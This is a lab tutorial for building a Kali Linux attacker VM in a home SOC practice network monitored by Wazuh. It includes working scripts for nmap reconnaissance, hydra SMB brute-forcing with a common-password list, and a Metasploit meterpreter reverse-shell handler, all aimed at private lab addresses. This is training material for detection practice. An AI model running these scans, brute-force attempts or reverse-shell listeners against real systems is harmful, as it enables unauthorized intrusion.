# Phase 4: Kali Attacker VM Setup

## Overview
This phase creates the **red team machine** in your SOC lab. The Kali Linux VM will:
- Represent an external threat actor attacking your network
- Have NO Wazuh Agent (it's the "bad guy" — you don't monitor it)
- Be used to launch simulated attacks against the Windows victim
- Be monitored indirectly through the Windows VM's logs

This is where you get hands-on with **offensive security tools**: network scanning, brute force attacks, exploitation, and post-exploitation.

## Hardware Requirements for This VM
- **vCPU**: 2 cores
- **RAM**: 4 GB
- **Disk**: 40 GB
- **OS**: Kali Linux 2024 (rolling release)
- **Network**: Host-Only (VMnet2 from Phase 1)
- **Static IP**: 192.168.100.30

---

## Step 1: Create the Kali Linux VM

### 1.1 Start VM Creation
1. Open **VMware Workstation**
2. Click **File → New Virtual Machine**
3. Choose **Custom (advanced)** configuration
4. Click **Next**

### 1.2 Hardware Compatibility
- Select **Workstation X.X** (latest version)
- Click **Next**

### 1.3 Installation Media
- Select **Installer disc image file (ISO)**
- Click **Browse** and select your **Kali Linux ISO**
  - Download from: https://www.kali.org/get-kali/#kali-platforms
  - Get the **Bare Metal 64-bit** or **Installer** ISO (not Live)
  - Latest stable version is fine
- Click **Next**

### 1.4 Guest Operating System
- Select **Linux**
- Version: **Debian 10.x 64-bit** (Kali is Debian-based)
- Click **Next**

### 1.5 Virtual Machine Name and Location
- **Name**: `kali-attacker` (or similar)
- **Location**: Choose a folder with space (40 GB minimum)
- Click **Next**

### 1.6 Processor Configuration
- **Processors**: 2
- **Cores per processor**: 1 (total = 2 vCPU)
- Click **Next**

### 1.7 Memory Configuration
- **Memory**: 4096 MB (4 GB)
- Click **Next**

### 1.8 Network Type
- Select **Custom**
- Dropdown: Select **VMnet2** (the Host-Only network from Phase 1)
- Click **Next**

### 1.9 I/O Controller Types
- Keep defaults (SCSI)
- Click **Next**

### 1.10 Virtual Disk Type
- Select **SCSI**
- Click **Next**

### 1.11 Disk Capacity
- **Size**: 40 GB
- Select **Store virtual disk as a single file**
- Click **Next**

### 1.12 Finish
- Review all settings
- Click **Finish**

The Kali Linux installer will boot automatically.

---

## Step 2: Install Kali Linux

### 2.1 Kali Boot Menu
1. Select **Graphical install** (easier than text mode)
2. Press **Enter**

### 2.2 Language and Keyboard
- Select your language (English)
- Click **Continue**
- Select keyboard layout
- Click **Continue**

### 2.3 Network Configuration

This is important for your lab. Set a **static IP**:

1. When asked about network interface, select your interface (usually `ens33`)
2. Choose **Configure network manually**
3. Set:
   ```
   IP Address: 192.168.100.30
   Netmask: 255.255.255.0
   Gateway: 192.168.100.1
   Nameserver 1: 8.8.8.8
   Nameserver 2: 8.8.4.4
   ```
4. Click **Continue**

### 2.4 Mirror and Proxy
- Keep default Kali repository
- Leave proxy blank (no internet in lab)
- Click **Continue**

### 2.5 User Account

Create a user account for day-to-day use:

```
Full name: Attacker
Username: attacker
Password: [create a password]
Confirm password: [re-enter]
```

Keep this password safe.

### 2.6 Partitioning

Select **Guided - use entire disk**:

1. Select the disk shown (40GB)
2. Choose **All files in one partition** (simpler)
3. Confirm the summary
4. Write changes to disk (click Yes)

The installer will install Kali (5-10 minutes).

### 2.7 GRUB Bootloader
- Select **Yes** to install GRUB bootloader
- Select `/dev/sda` (your disk)

Kali will finish installation and reboot.

---

## Step 3: Post-Installation Setup

### 3.1 Login to Kali

After reboot:
```
kali login: attacker
Password: [enter your password]
```

### 3.2 Update Kali Packages

```bash
sudo apt update
sudo apt upgrade -y
sudo apt dist-upgrade -y
```

This updates all tools and security patches (takes 5-10 minutes depending on your internet).

### 3.3 Verify Network Configuration

```bash
hostname -I
```

Should show: `192.168.100.30`

### 3.4 Verify Connectivity to Wazuh Server

```bash
ping -c 3 192.168.100.10
```

Should get 3 successful replies.

### 3.5 Verify Connectivity to Windows Victim

```bash
ping -c 3 192.168.100.20
```

Should get 3 successful replies.

If both pings work, your lab network is properly connected!

---

## Step 4: Verify Pre-installed Tools

Kali comes with all the tools you need pre-installed. Verify the key ones:

### 4.1 Nmap (Port Scanning)

```bash
nmap --version
```

Should show something like: `Nmap version 7.x`

### 4.2 Metasploit Framework

```bash
msfconsole --version
```

Should show version info.

### 4.3 Hydra (Brute Force)

```bash
hydra -h
```

Should show help menu.

### 4.4 Netcat (Network Utility)

```bash
nc -h
```

Should show help (ignore warnings).

### 4.5 Hashcat (Password Cracking)

```bash
hashcat --version
```

Should show version info.

If all these commands work, all tools are ready!

---

## Step 5: Configure Metasploit Database (Optional but Recommended)

Metasploit works better with a database. Set it up:

### 5.1 Start PostgreSQL

```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
```

### 5.2 Initialize MSFconsole Database

```bash
msfdb init
```

This may take a minute. You'll see output ending with:
```
[+] Database initialization complete
[+] Now run 'msfconsole' to get started
```

### 5.3 Verify Metasploit Database

```bash
msfdb status
```

Should show:
```
[+] Connected to msf. Connection type: postgresql.
```

---

## Step 6: Create Attack Simulation Scripts (Optional)

It's helpful to have reference scripts for common attacks. Create a working directory:

### 6.1 Create Attack Scripts Folder

```bash
mkdir -p ~/attack-scripts
cd ~/attack-scripts
```

### 6.2 Create Nmap Reconnaissance Script

Create a file `reconnaissance.sh`:

```bash
cat > ~/attack-scripts/reconnaissance.sh << 'EOF'
#!/bin/bash
# Reconnaissance script - maps network and services

TARGET=${1:-192.168.100.20}

echo "[*] Starting reconnaissance on $TARGET"
echo ""

echo "[*] Step 1: ICMP Ping Sweep"
ping -c 3 $TARGET
echo ""

echo "[*] Step 2: TCP SYN Scan (top 1000 ports)"
nmap -sS $TARGET
echo ""

echo "[*] Step 3: Service Version Detection"
nmap -sV -p 445,3389,139,135 $TARGET
echo ""

echo "[*] Step 4: OS Fingerprinting"
nmap -O $TARGET
echo ""

echo "[+] Reconnaissance complete. Document findings."
EOF

chmod +x ~/attack-scripts/reconnaissance.sh
```

### 6.3 Create Brute Force Script

Create a file `brute_force.sh`:

```bash
cat > ~/attack-scripts/brute_force.sh << 'EOF'
#!/bin/bash
# Brute force RDP/SMB logon attack

TARGET=${1:-192.168.100.20}
USERNAME=${2:-administrator}

echo "[*] Starting brute force attack on $TARGET"
echo "[*] Username: $USERNAME"
echo ""

# Common Windows passwords
PASSWORDS="password P@ssw0rd P@ss1234 123456 admin Admin@123"

for pass in $PASSWORDS; do
    echo "[*] Trying: $USERNAME / $pass"
    # Using hydra for SMB (445)
    hydra -l $USERNAME -p $pass -t 4 smb://$TARGET -V 2>/dev/null | grep "Login successful" && echo "[+] FOUND: $pass" && break
done

echo "[+] Brute force attempt complete"
EOF

chmod +x ~/attack-scripts/brute_force.sh
```

### 6.4 Create Metasploit Handler Script

Create a file `handler.sh`:

```bash
cat > ~/attack-scripts/handler.sh << 'EOF'
#!/bin/bash
# Metasploit listener for reverse shell

LHOST=${1:-192.168.100.30}
LPORT=${2:-4444}

echo "[*] Starting Metasploit handler"
echo "[*] Listening on $LHOST:$LPORT"
echo ""

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
EOF

chmod +x ~/attack-scripts/handler.sh
```

These scripts are references for the attacks you'll run in Phase 5.

---

## Step 7: Document Your Attacker VM

Create a reference file for your lab:

```bash
cat > ~/lab-config.txt << 'EOF'
===== KALI ATTACKER VM =====
IP Address: 192.168.100.30
Subnet Mask: 255.255.255.0
Gateway: 192.168.100.1
Username: attacker
Password: [your password]

Target Information:
- Wazuh Server: 192.168.100.10
- Windows Victim: 192.168.100.20

Tools Available:
- nmap: Port scanning
- hydra: Brute force attacks
- metasploit: Exploitation framework
- hashcat: Password cracking
- john: Hash cracking
- netcat: Network utility
- proxychains: Proxy chaining
- burp suite: Web application testing (community edition)

Network Connectivity:
$ ping 192.168.100.10  # Should reach Wazuh Server
$ ping 192.168.100.20  # Should reach Windows Victim
EOF

cat ~/lab-config.txt
```

---

## Step 8: Verify No Wazuh Agent (Important!)

**Confirm that Kali has NO Wazuh Agent installed.** This is intentional — Kali is the attacker, unmonitored:

```bash
ls /var/ossec/
```

Should show: `No such file or directory`

If Wazuh is somehow installed, remove it:

```bash
sudo apt remove wazuh-agent -y
```

---

## Troubleshooting

### Issue: Cannot ping Wazuh Server or Windows Victim
**Solution**:
1. Check your IP configuration:
```bash
hostname -I
```
Should show: `192.168.100.30`

2. Check if interface is up:
```bash
ip link show
```

3. If network is down, restart networking:
```bash
sudo systemctl restart networking
```

4. Verify VMnet2 is properly configured (go back to Phase 1)

### Issue: Metasploit shows "database not available"
**Solution**:
1. Start PostgreSQL:
```bash
sudo systemctl start postgresql
```

2. Reinitialize database:
```bash
msfdb delete
msfdb init
```

### Issue: Running tools shows "command not found"
**Solution**:
1. Ensure Kali packages are updated:
```bash
sudo apt update
sudo apt install nmap hydra metasploit-framework -y
```

2. Check tool installation:
```bash
which nmap
which hydra
which msfconsole
```

Should show paths for each tool.

### Issue: SSH not available (if you need remote access)
**Solution**:
1. Install OpenSSH:
```bash
sudo apt install openssh-server -y
sudo systemctl start ssh
sudo systemctl enable ssh
```

2. Test from another machine:
```bash
ssh attacker@192.168.100.30
```

---

## What You Can Do from Here

Your Kali attacker is now ready. In Phase 5, you'll use it to:

1. **Reconnaissance**: Scan ports and discover services on the Windows VM
2. **Initial Compromise**: Attempt brute force logins on RDP/SMB
3. **Exploitation**: Use Metasploit to exploit vulnerabilities
4. **Persistence**: Create backdoors and reverse shells
5. **Privilege Escalation**: Attempt to gain system-level access
6. **Data Exfiltration**: Simulate stealing files

All while the Wazuh Server detects and alerts on your every move!

---

## What Happens Next

After completing this phase:
1. ✅ Kali Linux VM running with static IP 192.168.100.30
2. ✅ All offensive tools pre-installed and ready (nmap, hydra, metasploit, etc.)
3. ✅ Network connectivity verified to both Wazuh Server and Windows Victim
4. ✅ Metasploit database initialized (optional but recommended)
5. ✅ Attack simulation scripts created for reference
6. ✅ Confirmed NO Wazuh Agent on Kali (intentional)

Next: **Phase 5: Simulate and Detect Threats** — where you'll run actual attacks from Kali and detect them in Wazuh!

---

## Verification Checklist

- [ ] Kali Linux VM created with correct specs (2 vCPU, 4GB RAM, 40GB disk, VMnet2)
- [ ] Kali Linux installed and booted successfully
- [ ] Static IP set to 192.168.100.30 (verified with `hostname -I`)
- [ ] Can ping Wazuh Server at 192.168.100.10
- [ ] Can ping Windows Victim at 192.168.100.20
- [ ] All packages updated (`apt update && apt upgrade`)
- [ ] Nmap installed and verified (`nmap --version`)
- [ ] Hydra installed and verified (`hydra -h`)
- [ ] Metasploit Framework installed and verified (`msfconsole --version`)
- [ ] Netcat installed and verified (`nc -h`)
- [ ] Hashcat installed and verified (`hashcat --version`)
- [ ] PostgreSQL database initialized for Metasploit (`msfdb status` shows connected)
- [ ] Attack simulation scripts created (reconnaissance.sh, brute_force.sh, handler.sh)
- [ ] Lab configuration file created (~/lab-config.txt)
- [ ] Confirmed NO Wazuh Agent installed on Kali
- [ ] Understand Kali is the "red team" / attacker
- [ ] Ready to launch simulated attacks in Phase 5

---

## Reference Commands Quick List

```bash
# Network verification
hostname -I
ip link show
ping 192.168.100.10  # Wazuh Server
ping 192.168.100.20  # Windows Victim

# Tool verification
nmap --version
hydra -h
msfconsole --version
hashcat --version

# Metasploit database
msfdb status
msfdb init

# Start services
sudo systemctl start postgresql
sudo systemctl start ssh

# Check if Wazuh agent exists (it shouldn't)
ls /var/ossec/

# Run attack scripts
./attack-scripts/reconnaissance.sh 192.168.100.20
./attack-scripts/brute_force.sh 192.168.100.20 administrator
```

---

## Next Phase
Proceed to **Phase 5: Simulate and Detect Threats** when all checklist items are complete.
